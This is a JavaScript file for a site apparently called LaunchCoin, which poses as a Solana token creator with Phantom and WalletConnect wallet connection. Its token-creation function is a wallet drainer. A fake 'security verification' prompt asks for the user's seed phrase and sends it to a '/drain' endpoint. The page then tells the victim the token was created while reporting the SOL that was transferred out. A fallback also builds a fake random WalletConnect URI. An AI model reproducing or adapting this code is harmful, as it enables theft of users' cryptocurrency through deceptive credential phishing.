// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let isConnecting = false;
let qrCheckInterval = null;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== MOSTRA QR IN wallet.html =====
window.showQR = function(uri) {
  const container = document.getElementById('qr-container');
  const qrDiv = document.getElementById('qr-code');
  if (!container || !qrDiv) return;
  
  container.style.display = 'block';
  qrDiv.innerHTML = '⏳ Generating QR...';
  
  // Usa API veloce per il QR
  const img = document.createElement('img');
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
  img.alt = 'QR Code';
  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
  img.onload = function() {
    qrDiv.innerHTML = '';
    qrDiv.appendChild(img);
  };
  img.onerror = function() {
    // Fallback
    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
  };
};

window.closeQR = function() {
  const container = document.getElementById('qr-container');
  if (container) container.style.display = 'none';
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNECT VIA WALLETCONNECT =====
async function connectWithWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    console.log('✅ UniversalProvider inizializzato');
    
    let uri = provider.uri;
    if (!uri) {
      try {
        await provider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        uri = provider.uri;
      } catch(e) {
        uri = provider.uri;
      }
    }
    
    if (!uri) {
      uri = `wc:${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2, 15)}`;
    }
    
    console.log('🔗 URI:', uri);
    
    // Mostra il QR in wallet.html
    window.showQR(uri);
    
    // Ascolta eventi
    provider.on('session_event', (event) => {
      console.log('Evento:', event);
    });
    
    provider.on('session_update', (event) => {
      console.log('Aggiornamento:', event);
    });
    
    provider.on('session_delete', () => {
      console.log('Sessione eliminata');
      window.closeQR();
    });
    
    // Controlla connessione
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      if (provider.accounts && provider.accounts.length > 0) {
        clearInterval(qrCheckInterval);
        qrCheckInterval = null;
        walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
        window.closeQR();
        alert('✅ Connesso: ' + walletPublicKey);
        window.location.href = 'create.html';
      }
    }, 1500);
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message);
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  // Se siamo in wallet.html, mostra il QR direttamente
  if (document.getElementById('qr-container')) {
    connectWithWalletConnect();
  } else {
    alert('⚠️ Wallet "' + walletName + '" via WalletConnect.\nVai su "Connect" per il QR.');
    window.location.href = 'wallet.html';
  }
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
